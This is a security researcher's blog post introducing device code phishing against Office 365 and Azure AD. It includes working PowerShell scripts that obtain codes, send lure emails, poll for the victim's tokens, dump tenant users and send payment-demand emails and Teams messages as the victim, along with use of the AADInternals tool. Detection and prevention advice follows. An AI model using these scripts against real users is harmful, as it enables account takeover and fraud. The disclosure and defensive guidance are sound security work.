+++
title = "Introducing a new phishing technique for compromising Office 365 accounts"
date = "2020-10-13"
lastmod = "2021-09-10"
categories =["blog"]
tags = ["Azure","security","phishing"]
thumbnail = "/images/posts/phishing.png"
+++

The <a href="https://threatpost.com/microsoft-seizes-domains-office-365-phishing-scam/157261" target="_blank">ongoing global phishing campaings</a> againts Microsoft 365 have used various phishing techniques. 
Currently attackers are utilising forged login sites and OAuth app consents.

In this blog, I'll introduce a new phishing technique based on Azure AD device code authentication flow. 
I'll also provide instructions on how to detect usage of compromised credentials and what to do to prevent phishing using the new technique.

<!--more-->
# What is phishing

According to <a href="https://phishing.org/what-is-phishing" target="_blank">phishing.org</a>:

> Phishing is a cybercrime in which a target or targets are contacted by email, telephone or text message by someone posing as a legitimate institution to lure individuals into providing sensitive data such as personally identifiable information, banking and credit card details, and passwords.



# Current phishing techniques

There are numerous <a href="https://www.phishing.org/phishing-techniques" target="_blank">phishing techniques</a> to be used by criminals. Next I'll shortly introduce two of the most used techniques related to Microsoft 365 and Azure AD.

## Forged login pages
This is the most common phishing technique, where attackers have created login pages that imitate legit login screens. When a victim enters credentials, attackers can use those to log in using victim's identity.

Lately some sophisticated phishing sites have checked the entered credentials <a href="https://threatpost.com/office-365-phishing-attack-leverages-real-time-active-directory-validation/159188/" target="_blank">in real time using authentication APIs</a>.

This type of phishing can be easily prevented by enabling <a href="https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks" target="_blank">Multi-Factor Authentication</a> (MFA).
MFA is included in all Microsoft 365 and Azure AD subscriptions. 

**Note!** Using MFA does not prevent the phishing per se. Instead, it prevents attackers from logging in as the victim as the attacker is not able to perform the MFA. 
However, if the victim is using the same password on other services, the compromised credentials can be used on those services.

## OAuth consent

Another commonly used technique is to lure victims to <a href="https://www.bleepingcomputer.com/news/security/phishing-attack-hijacks-office-365-accounts-using-oauth-apps/" target="_blank">give consent to an application</a> to access their data. 
These apps are often named to mimic legit apps, such as "0365 Access" or "Newsletter App":

![User consent](/images/posts/phishing_4.png)


:point_right: See a <a href="https://www.nixu.com/blog/demonstration-illicit-consent-grant-attack-azure-ad-office-365" target="_blank">demo</a> by <a href="https://twitter.com/SantasaloJoosua" target="_blank">@SantasaloJoosua</a> to learn how this works in real-life.

This type of phishing can be reduced by restricting users from registering new apps to Azure AD:
![Azure Portal](/images/posts/phishing_2.png)

There is also a preview feature which allows preventing the users for giving consents to apps:
![Azure Portal](/images/posts/phishing_3.png)

# New phishing technique: device code authentication

Next, I'll demonstrate a new phishing technique for compromising Office 365 / Azure AD accounts.

## What is device code authentication

According to Microsoft <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code" target="_blank">documentation</a> the device code authentication:

> allows users to sign in to input-constrained devices such as a smart TV, IoT device, or printer. To enable this flow, the device has the user visit a webpage in their browser on another device to sign in. Once the user signs in, the device is able to get access tokens and refresh tokens as needed.

The process is as follows:

1. A user starts an app supporting device code flow on a device
2. The app connects to Azure AD /devicecode endpoint and sends **client_id** and **resource** 
3. Azure AD sends back **device_code**, **user_code**, and **verification_url**
4. Device shows the **verification_url** (hxxps://microsoft.com/devicelogin) and the **user_code** to the user
5. User opens a browsers and browses to **verification_url**, gives the **user_code** when asked and logs in 
6. Device polls the Azure AD until after succesfull login it gets **access_token** and **refresh_token**

![Device Code flow](/images/posts/phishing_5.png)


## Phishing with device code authentication

The basic idea to utilise device code authentication for phishing is following.

1. An attacker connects to /devicecode endpoint and sends **client_id** and **resource**
2. After receiving **verification_uri** and **user_code**, create an email containing a link to **verification_uri** and **user_code**, and send it to the victim.
3. Victim clicks the link, provides the code and completes the sign in.
4. The attacker receives **access_token** and **refresh_token** and can now mimic the victim.

### 1. Connecting to /devicecode endpoint

The first step is to make a http POST to Azure AD devicecode endpoint:
```
 https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
I'm using the following parameters. I chose to use "Microsoft Office" client_id because it looks the most legit app name, and it can be used to access other resources too. 
The chosen resource gives access to AAD Graph API which is used by MSOnline PowerShell module.

Parameter | Value 
---       | ---
client_id | d3590ed6-52b3-4102-aeff-aad2292ab01c 
resource  | https://graph.windows.net

The response is similar to following:
{{< highlight json >}}
{
	"user_code": "CLZ8HAV2L",
	"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
	"verification_url": "https://microsoft.com/devicelogin",
	"expires_in": "900",
	"interval": "5",
	"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
{{< /highlight>}}

Parameter        | Description
---              | ---
user_code        | The code a user will enter when requested
device_code      | The device code used to "poll" for authentication result
verification_url | The url the user needs to browse for authentication 
expires_in       | The expiration time in seconds (15 minutes)
interval         | The interval in seconds how often the client should poll for authentication
message          | The pre-formatted message to be show to the user

Here is a script to connect to devicelogin endpoint:
{{< highlight powershell >}}
# Create a body, we'll be using client id of "Microsoft Office"
$body=@{
	"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes
$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
{{< /highlight>}}

**Note!** I'm using a version 1.0 which is a little bit different than v2.0 flow used in the <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code" target="_blank">documentation</a>.

### 2. Creating a phishing email

Now that we have the **verification_url** (always the same) and **user_code** we can create and send a phishing email.

**Note!** For sending email you need a working smtp service.

Here is a script to send a phishing email to the victim:

{{< highlight powershell >}}
# Create a message
$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email
Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml 
{{< /highlight>}}

The received email looks like this:
![Device Code flow](/images/posts/phishing_6.png)


### 3. "Catching the fish" - victim performs the authentication

When a victim clicks the link, the following site appears. As we can see, the url is a legit Microsoft url. The user is asked to enter the code from the email.

![Device code](/images/posts/phishing_7.png)

After entering the code, user is asked to select the user to sign in. As we can see, the user is asked to sign in to **Microsoft Office** - no consents are asked.

**Note!** If the user is not logged in, the user needs to log in using whatever methods the target organisation is using.

![Login](/images/posts/phishing_8.png)

After successfull authentication, the following is shown to the user. <br>

![Profit](/images/posts/phishing_9.png)

:warning: **At this point the identity of the user is compromised!** :warning: 

### 4. Retrieving the access tokens

The last step for the attacker is to retrieve the access tokens. After completing the step 2. the attacker starts polling the Azure AD for the authentication status.

Attacker needs to make an http POST to Azure AD token endpoint every 5 seconds:
```
 https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
The request must include the following parameters (code is the device_code from the step 1)

Parameter  | Value 
---        | ---
client_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c 
resource   | https://graph.windows.net
code       | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA
grant_type | urn:ietf:params:oauth:grant-type:device_code

If the authentication is pending, an http error **400 Bad Request** is returned with the following content:

{{< highlight json >}}
{
	"error": "authorization_pending",
	"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
	"error_codes": [70016],
	"timestamp": "2020-10-13 18:06:07Z",
	"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
	"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
	"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
{{< /highlight>}}

After successfull login, we'll get the following response (tokens truncated):
{{< highlight json >}}
{
	"token_type": "Bearer",
	"scope": "user_impersonation",
	"expires_in": "7199",
	"ext_expires_in": "7199",
	"expires_on": "1602662787",
	"not_before": "1602655287",
	"resource": "https://graph.windows.net",
	"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
	"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
	"foci": "1",
	"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
{{< /highlight>}}

The following script connects to the Azure AD token endpoint and polls for authentication status.
{{< highlight powershell >}}
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests
$body=@{
	"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
	"code" =       $authResponse.device_code
	"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded
while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "Timeout occurred"
		return
	}
				
	# Try to get the response. Will give 40x while pending so we need to try&catch
	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# This is normal flow, always returns 40x unless successful
		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		Write-Host $details.error

		if(!$continue)
		{
			# Not pending so this is a real error
			Write-Error $details.error_description
			return
		}
	}

	# If we got response, all okay!
	if($response)
	{
		break # Exit the loop
	}
}
{{< /highlight>}}

Now we can use the access token to impersonate the victim:
{{< highlight powershell >}}
# Dump the tenant users to csv
Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
{{< /highlight>}}

We can also get access tokens to other services using the refresh token as long as the client_id remains the same. 

The following script gets an access token for Exchange Online.

{{< highlight powershell >}}
# Create body for getting access token for Exchange Online
$body=@{
	"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" =    "refresh_token"
	"scope" =         "openid"
	"resource" =      "https://outlook.office365.com"
	"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim
Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
{{< /highlight>}}

# Using AADInternals for phishing

AADInternals (v0.4.4 or later) has an <a href="/aadinternals/#invoke-aadintphishing" target="_blank">Invoke-AADIntPhishing</a> function
which automates the phishing process.

The phishing message can be customised, the default message is following:

```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
Default message in email:<br>
![Phishing email](/images/posts/phishing_11.png)

Default message in Teams:<br>
![Phishing message](/images/posts/phishing_12.png)

## Email

The following example sends a phishing email using a customised message. The tokens are saved to the cache.
{{< highlight powershell >}}
# Create a custom message
$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache
Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache 
{{< /highlight>}}

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
And now we can send email as the victim using the cached token.
{{< highlight powershell >}}
# Send email as the victim
Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
{{< /highlight>}}

We can also send a Teams message to make the payment request more urgent:
{{< highlight powershell >}}
# Send Teams message as the victim
Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
{{< /highlight>}}
```
Sent                MessageID         
----                ---------         
16/10/2020 14.40.23 132473328207053858
```

**The following video shows how to use AADInternals for email phishing.**

<iframe width="560" height="315" src="https://www.youtube.com/embed/Yz4zjD3EUUg" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

## Teams

AADInternals supports sending phishing messages as Teams chat messages.

**Note!** After the victim has "authenticated" and the tokens are received, AADInternals will replace the original message. This message can be provided with -CleanMessage parameter. 

The default clean message is:
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
![Teams clean message](/images/posts/phishing_13.png)

The following example sends a phishing email using customised messages. The tokens are saved to the cache.
{{< highlight powershell >}}
# Get access token for Azure Core Management
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages
$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages
Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
{{< /highlight>}}

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**The following video shows how to use AADInternals for Teams phishing.**

<iframe width="560" height="315" src="https://www.youtube.com/embed/FX20qa58TEQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

# Detecting

First of all, from the Azure AD point-of-view the login takes place where the authentication was **initiated**. This is a very important point to understand.
This means that in the signing log, the login was performed from the **attacker location and device**, not from user's. 

However, the access tokens acquired using the refresh token **do not appear in signing log!**

Below is an example where I initiated the phishing from an Azure VM (well, from the <a href="/post/cloudshell/" target="_blank">cloud shell</a> to be more specific). As we can see, the login using the "Microsoft Office" client took place at
7:23 AM from the ip-address 51.144.240.233. However, getting the access token for Exchange Online at 7:27 AM is not shown in the log.

![Azure AD signing log](/images/posts/phishing_10.png)

:warning: If there are indications that the user is signing in from non-typical locations, the user account might be compromised.

# Preventing

The only effective way for preventing phishing using this technique is to use <a href="https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview" target="_blank">Conditional Access</a> (CA) policies.
To be specific, the **phishing can not be prevented**, but we can **prevent users from signing in** based on certain rules.
Especially the location and device state based policies are effective for protecting accounts. This applies for the all phishing techniques currently used.

However, it is not possible to cover all scenarios. For instance, forcing MFA for logins from illicit locations does not help if the user is logging in using MFA.

# Mitigating

If the user has been compromised, the user's refresh tokens can be <a href="https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0" target="_blank">revoked</a>, which
prevents attacker getting new access tokens with the compromised refresh token.

# Summary

As far as I know, the device code authentication flow technique has not used for phishing before. 

From the attacker point of view, this method has a couple of pros:

* No need to register any apps
* No need to setup a phishing infrastructure for fake login pages etc.
* The user is only asked to sign in (usually to "Microsoft Office") - no consents asked
* Everything happens in **login.microsoftonline.com** namespace
* Attacker can use any client_id and resource (not all combinations work though)
* If the user signed in using MFA, the access token also has MFA claim (this includes also the access tokens fetched using the refresh token)
* Preventing requires Conditional Access (and Azure AD Premium P1/P2 licenses)

From the attacker point of view, this method has at least one con:

* The user code is valid only for 15 minutes

Of course, the attacker can minimise the time restriction by sending the phishing email to multiple recipients - this will increase the probability that someone signs in using the code.

Another way is to implement <a href="https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333" target="_blank">a proxy</a> which would start the authentication when the link is clicked (credits to <a href="https://twitter.com/MrUn1k0d3r" target="_blank">@MrUn1k0d3r</a>).
However, this way the advantage of using a legit microsoft.com url would be lost.

Checklist for surviving phishing campaings:
 
1. **Educate your users** about information security and phishing :woman_teacher:
2. Use Multi-Factor Authentication (MFA) :iphone: 
3. Use Intune :hammer_and_wrench: and Conditional Access (CA) :stop_sign:


# References

* Phishing.org: <a href="https://phishing.org/what-is-phishing" target="_blank">What Is Phishing?</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks" target="_blank">How it works: Azure Multi-Factor Authentication</a> 
* @SantasaloJoosua: <a href="https://www.nixu.com/blog/demonstration-illicit-consent-grant-attack-azure-ad-office-365" target="_blank">Demonstration - Illicit consent grant attack in Azure AD/Office 365</a>.
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code" target="_blank">Microsoft identity platform and the OAuth 2.0 device authorization grant flow</a> 
* Microsoft: <a href="https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview" target="_blank">What is Conditional Access?</a>
* Microsoft: <a href="https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0" target="_blank">Revoke-AzureADUserAllRefreshToken</a>
* @MrUn1k0d3r: <a href="https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333" target="_blank">Office device code phishing proxy</a>
